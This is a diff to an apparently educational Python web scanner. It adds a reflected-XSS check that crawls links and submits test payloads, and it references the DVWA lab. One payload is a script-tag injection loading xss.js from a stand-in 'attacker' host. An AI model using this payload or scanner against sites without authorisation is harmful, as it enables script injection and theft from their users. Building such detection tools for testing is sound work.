@@ -215,12 +215,26 @@ def checkLinks(myLinks):
 	return goodLinks
 
 def submitForms(myLinks):
+	myPayload = ["1", "2", "3"]
 	global myHtmlGetter
 	count = 0
 	for i in myLinks:
-		myHtmlGetter.formSub(myLinks[count])
+		myHtmlGetter.formSub(myLinks[count], myPayload)
 		count = count + 1
 
+def xssCheck(myLinks):
+	myPayload = ["<input type=\"text\" name=\"state\" value=\"INPUT_FROM_USER\">",
+				 "http://example/?var=<SCRIPT%20a=\">\"%20SRC=\"http://attacker/xss.js\"></SCRIPT>"]
+	global myHtmlGetter
+	count = 0
+	myList = []
+	for i in myLinks:
+		response = myHtmlGetter.xss(myLinks[count], myPayload)
+		if response:
+			myList.append(myLinks[count])
+			#print str(myLinks[count]) + " is vulnerable to XSS"
+		count = count +1
+	return myList
 	# Main
 def main(argv):
 	global myBrowser
@@ -249,6 +263,7 @@ def main(argv):
 	matchedDomains = []
 	links = []
 	validLinks = []
+	xssVulnList = []
 
 	try:
 		opts, args = getopt.getopt(argv, "u:p:d:", ["login=", "domain=", "dvwa"])
@@ -284,23 +299,30 @@ def main(argv):
 	#matchedDomains = isDomain(links,myDomainName)
     	#matchedDomains = rmDup(matchedDomains)
 	validLinks = checkLinks(recursiveLinks)
-	count = 0
-	for i in validLinks:
-		print validLinks[count]
-		count = count + 1
+	#count = 0
+	#for i in validLinks:
+	#	print validLinks[count]
+	#	count = count + 1
 	#if isLogin:
 		#print myUsername, " ,", myPassword
 	#	myHtmlGetter.setCredentials(myUsername, myPassword)
 	#	myHtmlGetter.login(loginPage)
 
-	count = 0
-	for i in validLinks:
-		myHtmlGetter.formSub(str(validLinks[count]))
-		count = count + 1
+	#count = 0
+	#for i in validLinks:
+	#	myHtmlGetter.formSub(str(validLinks[count]))
+	#	count = count + 1
 
 	#myHtmlGetter.formSub("http://192.168.56.102/dvwa/vulnerabilities/captcha")
 
 	#submitForms(validLinks)
+
+	xssVulnList = xssCheck(validLinks)
+	count = 0
+	print "The following links are vulnerable to Reflective Cross Site Scripting"
+	for i in xssVulnList:
+		print xssVulnList[count]
+		count = count + 1
 
 if __name__ == "__main__":
 	main(sys.argv[1:])
